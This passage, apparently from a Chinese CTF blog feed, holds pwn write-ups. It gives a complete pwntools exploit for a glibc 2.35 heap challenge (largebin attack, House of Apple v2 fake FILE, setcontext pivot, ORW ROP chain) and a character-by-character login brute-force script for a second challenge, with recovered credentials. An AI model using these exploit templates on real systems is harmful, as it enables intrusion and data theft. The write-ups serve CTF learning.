class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t pointer 0x7ffff7de1390</span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="string">&#x27;\x90\x13\xde\xf7\xff\x7f\x00\x00&#x27;</span></span><br><span class="line">libc-2.35.so    0x7ffff7f71f58 0x7ffff7de1390 <span class="comment"># offset: 0x216f58</span></span><br><span class="line">libc-2.35.so    0x7ffff7f72018 0x7ffff7de1390 <span class="comment"># offset: 0x217018</span></span><br><span class="line"><span class="comment"># io_wfile_jumps: offset: 0x2170c0</span></span><br></pre></td></tr></table></figure><p>尽管io_wile_jumps被写0了，我们还是有2个虚表存了这个函数。在IDA中看了下，这两个表libc都没有给符号，但是都在io_wfile_jumps上面一点点所以利用应该也是比较简单。我们把本来写<code>IO_wfile_jumps</code>的地方写成<code>IO_wfile_Jumps-0xc0</code>就行了。</p><p>5个块够发起一次largebin attack了，所以下面附上笔者自己复现的思路，同时顺手总结一下通解板子希望下次能快点。有空抽出来单发一篇blog</p><h3 id="拆解步骤-House-of-apple-v2解决沙箱堆">拆解步骤-House of apple v2解决沙箱堆</h3><p>上次ciscn的那道题复现细节太多了，没有很好地整体把握，有点机械的对着exp解释代码，这次勤来看这篇应该不会有太大问题了。</p><ol><li class="lvl-3"><p>确定漏洞点，我们是否能有一次largebin attack的机会？是不是能UAF控制largebin的内容？如果是，那这题只需要绕过题目的限制就结束了</p></li><li class="lvl-3"><p>我们都知道House of apple的链条，下面具体说一下<br>House of Apple-v2是一系列利用高版本libc下不对IO_file_complete中处理宽字符流的_wide_data的vtable做检查的特性实现的攻击手段。具体思想是伪造io_file，然后有两步的跳转：</p></li></ol><ul class="lvl-0"><li class="lvl-4"><p>伪造wide_data指向一个可控地址，wide_data也是类似于一个IO_file的结构体</p></li><li class="lvl-4"><p>控制wide_data的vtable字段，让vtable指向可控地址</p></li><li class="lvl-4"><p>vtable+0x68写为我们要跳转的地方（exit的时候调用的io_wfile_overflow）</p></li></ul><ol start="3"><li class="lvl-3"><p>没有沙箱这里就可以使用one_gadget等手段了，有沙箱就涉及到栈迁移+ROP或ret2sc的思想</p></li></ol><p>我们利用setcontext+61(glibc 2.29前是setcontext+53并且能用rdi控制)这个gadget，在rdx+0xa0写入fakestack的地址，在rdx+0xa8写入第一条ROP指令起点（写个ret就行）注意要观察跳入setcontext的时候rdx或者rdi寄存器的内容。比如如果低于2.34的版本可以打free_hook然后rdi会是我们的fakeio地址。这道题是直接通过exit退出，调试发现跳入setcontext的时候rdx就是wide_data的地址</p><p>后面就可以执行我们的ROP链了。</p><h3 id="exp（板子和思路重要）">exp（板子和思路重要）</h3><p>对于涉及来回偏移，overlap复用空间等等操作来说，pwntools的<code>FileStructure()</code>就不那么好用了，可以参考自己写的下面这个带有偏移的板子来构造，单一chunk包含所有信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = gdb.debug(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your commodity size \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to delete: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to edit: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input the content \n&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter which to show: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">buf, content</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your target addr \n&#x27;</span>)</span><br><span class="line">p.send(buf)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">### largebin attack 预备</span></span><br><span class="line"><span class="comment"># 沙箱堆风水不影响large</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x510</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 1 in unsorted</span></span><br><span class="line">add(<span class="number">0x530</span>) <span class="comment"># 4, 1 in largebin，3&lt;1，我们等会用来触发攻击</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;The content is here \n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x21b110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] libc_base: &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + <span class="number">0x21b680</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x29c040</span></span><br><span class="line">link_map = libc_base + <span class="number">0x29d2e0</span></span><br><span class="line">setcontext = libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">mprotect = libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>))-<span class="number">0x1950</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] heap_base: &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># ---------------leak---------------</span></span><br><span class="line"><span class="comment">### -----------orw ROP chain using openat2: 基于glibc2.35, 再碰见2.35的或许可以直接套--------------</span></span><br><span class="line">ret = libc_base+<span class="number">0x2a3e6</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_rbx=libc_base+<span class="number">0x904a9</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rcx=libc_base+<span class="number">0x3d1ee</span></span><br><span class="line">pop_r8=libc_base+<span class="number">0x1659e6</span></span><br><span class="line">syscall=libc_base+<span class="number">0x91316</span></span><br><span class="line">flag_addr=heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span> <span class="comment"># 随便换</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">437</span>)+p64(pop_rsi)+p64(<span class="number">0xffffffffffffff9c</span>)+p64(pop_rdx_rbx)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rcx)+p64(heap_base+<span class="number">0x100</span>)+p64(pop_r8)+p64(<span class="number">24</span>)+p64(libc.sym[<span class="string">&quot;syscall&quot;</span>]) <span class="comment"># openat2，这里换open也行</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x3</span>)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx_rbx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&quot;read&quot;</span>]) <span class="comment"># read</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(libc.sym[<span class="string">&quot;write&quot;</span>]) <span class="comment"># write</span></span><br><span class="line">fake_stack=heap_base+<span class="number">0x1950</span>+<span class="number">0x200</span> <span class="comment"># 固定</span></span><br><span class="line"><span class="comment"># 确定flag的地址 填到flag里</span></span><br><span class="line"><span class="comment">### ---------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">### ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓重要↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="comment"># 下面的-0x10是因为edit写入是从内容开始写，而io_list_all到时候会被改成带有元数据的起始地址，-0x10</span></span><br><span class="line"><span class="comment"># 写成这样是更方便理解</span></span><br><span class="line">fs_wdata = fit( <span class="comment"># overlap 等于wide_vtable和wide_data在一起</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 前4字段，为了让我们能取回这个块，保留好</span></span><br><span class="line">        <span class="number">0x0</span>:p64(libc_base+<span class="number">0x21b110</span>), <span class="comment"># 0x520的bin地址</span></span><br><span class="line"><span class="number">0x8</span>:p64(libc_base+<span class="number">0x21b110</span>),</span><br><span class="line"><span class="number">0x10</span>:p64(heap_base+<span class="number">0x1950</span>), <span class="comment"># self</span></span><br><span class="line"><span class="number">0x18</span>: p64(IO_list_all-<span class="number">0x20</span>), <span class="comment"># target-0x20</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xa0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, <span class="comment"># wide_data 指向自己+0x100</span></span><br><span class="line">        <span class="number">0xd8</span>-<span class="number">0x10</span>: libc.sym._IO_wfile_jumps-<span class="number">0xc0</span>,</span><br><span class="line"><span class="comment"># wide_data+wide_vtable:</span></span><br><span class="line">        <span class="number">0x0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: <span class="string">b&quot;flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>), <span class="comment"># 随便填的</span></span><br><span class="line">        <span class="number">0x18</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2的要求</span></span><br><span class="line">        <span class="number">0x30</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(<span class="number">0x0</span>), <span class="comment"># apple v2的要求</span></span><br><span class="line">        <span class="number">0x68</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(setcontext),  <span class="comment"># _wide_vtable -&gt; wdoallocate的位置 控制流触发</span></span><br><span class="line"><span class="comment">## setcontext所需要的参数：</span></span><br><span class="line">        <span class="number">0xa0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(fake_stack),</span><br><span class="line">        <span class="number">0xa8</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: p64(ret), <span class="comment"># mov rdx+0xa8, push rcx, 返回地址</span></span><br><span class="line">        <span class="comment">## _wide_data-&gt;_wide_vtable 指向自己+0x100,和widedata平齐</span></span><br><span class="line">        <span class="number">0xE0</span>+<span class="number">0x100</span>-<span class="number">0x10</span>: heap_base+<span class="number">0x1950</span>+<span class="number">0x100</span>, </span><br><span class="line"><span class="comment"># ropchain/fake stack:</span></span><br><span class="line">        <span class="number">0x200</span>-<span class="number">0x10</span>: payload <span class="comment"># 换shellcode也行，那么上面0xa8就要写这里的地址了</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]_IO_list_all: <span class="subst">&#123;fs_wdata&#125;</span>&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,fs_wdata)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 4, largebin attack</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 5，取出刚刚的chunk3，让target写入chunk1的地址</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b * setcontext+61&quot;</span>)</span><br><span class="line">add(<span class="number">0x550</span>) <span class="comment"># 6 超出上限，用于触发exit的操作</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># exit-&gt;fcloseall(__flcloseall)-&gt;IO_cleanup-&gt;_IO_flush_all_lockp</span></span><br></pre></td></tr></table></figure><h2 id="tls-dtor-lists">tls_dtor_lists</h2><p>利用程序ld段进行攻击。</p><h2 id="libc-got-疑似预期解">libc got-疑似预期解</h2><blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;这个题目给了相当多的check：&lt;/p&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;沙箱ban了open，openat和execve，glibc 2.35, 释放有UAF, chunk只能分配0x500-0x5FF</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap实战——网鼎杯database wp</title>
    <link href="http://example.com/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/"/>
    <id>http://example.com/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/</id>
    <published>2024-11-10T15:29:18.000Z</published>
    <updated>2024-11-14T11:57:33.270Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。</p><h2 id="爆破用户名和密码">爆破用户名和密码</h2><p>这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目里能有什么提示，还是当时队里做逆向的师傅搞定的。观察发现，函数比较输入的逻辑比较奇怪。先调用了一个自己实现的strcmp，这里对我们的用户输入调用了strlen，然后按照用户输入的长度去比较：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != a2[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中间有不一样的就返回“Invalid username”，而如果全一样再去比较用户输入和指定用户名/密码的长度，不一样再输出&quot;Invalid password&quot;.这两种不同的回显加上源程序死循环调用的特性，让我们可以轻易的利用这一点去对用户名和密码进行爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello, Welcome to the Security Database. Login first!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your username:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    input(<span class="number">0</span>, s, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)my_strcmp(s, ptr) )<span class="comment">// 对我们的输入调了strlen，\0绕过？</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid username!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="built_in">strlen</span>(ptr) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid username length!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Username correct!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br></pre></td></tr></table></figure><p>下面是这个逐字节爆破的思路：让char从0到0xFF遍历，成功了（回显不一样）就加到发送内容的后面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crack_username</span>():</span><br><span class="line">    username = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=username + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid username!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid username length!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Username correct!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(username)</span><br><span class="line">                <span class="keyword">return</span> username</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_password</span>():</span><br><span class="line">    password=<span class="string">b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=password + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid password!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid password length!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Password correct!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">return</span> password</span><br></pre></td></tr></table></figure><h2 id="控制流与加密">控制流与加密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( input_10() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    save_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    read_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    delete_data();                <span class="comment">// UAF here</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    edit_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增查删改，程序允许通过exit函数退出。指针和size在全局变量数组里管理，可以看到free存在UAF漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete_data</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = input_10();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  ptr = (<span class="type">char</span> *)chunks[<span class="number">2</span> * v2 + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    encrypt1(byte_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">    encrypt2(byte_203180, ptr, LODWORD(chunks[<span class="number">2</span> * v2]));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  